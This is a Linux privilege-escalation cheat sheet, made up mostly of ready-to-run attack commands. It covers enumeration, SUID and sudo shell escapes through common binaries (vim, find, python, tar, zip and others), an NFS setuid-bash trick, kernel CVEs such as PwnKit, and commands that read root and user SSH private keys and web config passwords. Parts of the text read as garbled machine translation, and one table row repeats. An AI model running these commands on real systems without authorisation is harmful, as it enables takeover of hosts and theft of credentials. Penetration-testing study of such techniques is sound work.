# Linux Privilege Escalation Quick Reference

## Quick enumeration script

```bash
# LinPEAS Style enumeration
# 1. Check current user and permissions
id; whoami; sudo -l

# 2. Check SUID File
find / -perm -4000 2>/dev/null

# 3. Check sudo Available Commands
sudo -l

# 4. Check crontab
cat /etc/crontab
ls -la /etc/cron.d/

# 5. Check the network.
netstat -tulpn
ss -tulpn

# 6. Check Service
ps aux | grep root
systemctl list-units --type=service

# 7. Check writable directories
find / -writable -type d 2>/dev/null | grep -v proc

# 8. Check kernel version
uname -a
cat /etc/issue

# 9. Check sudo Version (CVE)
sudo --version

# 10. Check polkit Version
pkexec --version
```

## Common privilege escalation paths

### 1. SUID Privilege escalation

```bash
# Commonly exploitable SUID
nmap:        nmap --interactive; !sh
vim:         vim -c ':!/bin/sh'
less:        less /etc/passwd; !/bin/sh
more:        more /etc/passwd; !/bin/sh
awk:         awk 'BEGIN {system("/bin/sh")}'
find:        find . -exec /bin/sh -p \; -quit
python:      python -c 'import os; os.system("/bin/sh")'
perl:        perl -e 'exec "/bin/sh";'
ruby:        ruby -e 'exec "/bin/sh"'
bash:        bash -p
sh:          sh
```

### 2. Sudo Privilege escalation

```bash
# sudo -l View available commands
# Common Privilege Escalation Commands
sudo git help config; !/bin/sh
sudo less /etc/passwd; !/bin/sh
sudo vim; :!/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh -p \; -quit
sudo python -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh"'
sudo ruby -e 'exec "/bin/sh"'
sudo lua -e 'os.execute("/bin/sh")'
```

### 3. Cron Privilege escalation

```bash
# Check cron Task
cat /etc/crontab
ls -la /etc/cron.d/
# If cron tasks to root Run with permissions and writable
# Modify scripts to append malicious commands
```

### 4. NFS Privilege escalation

```bash
# If /home Yes no_root_squash
# Mount from Another Machine
mount -t nfs target:/home /tmp/nfs
cp /bin/bash /tmp/nfs/bash_suid
chmod +s /tmp/nfs/bash_suid
# Execute on the target machine /tmp/nfs/bash_suid -p
```

### 5. Kernel vulnerabilities

```python
# Search available exploit
# Common vulnerabilities:
# - dirtycow (CVE-2016-5195)
# - docker breakout
# - overlayfs (CVE-2021-3493)
# - Polkit (CVE-2021-4034) / PwnKit
# - etc.
```

### 6. Password reuse

```bash
# Check readable configuration files
cat /etc/mysql/my.cnf
cat /var/www/html/config.php
cat /home/*/.ssh/id_rsa
cat /root/.ssh/id_rsa
# If a password is found, attempt su root Or ssh root@localhost
```

## Sensitive file locations

```
/etc/passwd          # Can be written to by some systems
/etc/shadow          # Usually unreadable
/root/.ssh/          # root SSH Private key
/home/*/.ssh/       # User SSH private key
/var/www/html/       # Web Directory (may include configuration)
/tmp/                # Writable directory (put payload)
/etc/cron.d/         # Cron Configuration
/proc/self/environ   # Environment variables (including sensitive information)
/proc/self/fd/       # File descriptor (may leak information)
```

## GTFOBins (sudo suid Look up table)

| Order | Privilege escalation method |
|------|---------|
| `nmap` | `nmap --interactive` → `!sh` |
| `vim` | `:!/bin/sh` |
| `less` | `!/bin/sh` |
| `more` | `!/bin/sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `perl` | `perl -e 'exec "/bin/sh"'` |
| `python` | `python -c 'import os; os.system("/bin/sh")'` |
| `ruby` | `ruby -e 'exec "/bin/sh"'` |
| `git` | `git help config` → `!/bin/sh` |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `zip` | `zip /tmp/test.zip /tmp/test -T -TT 'sh #'` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
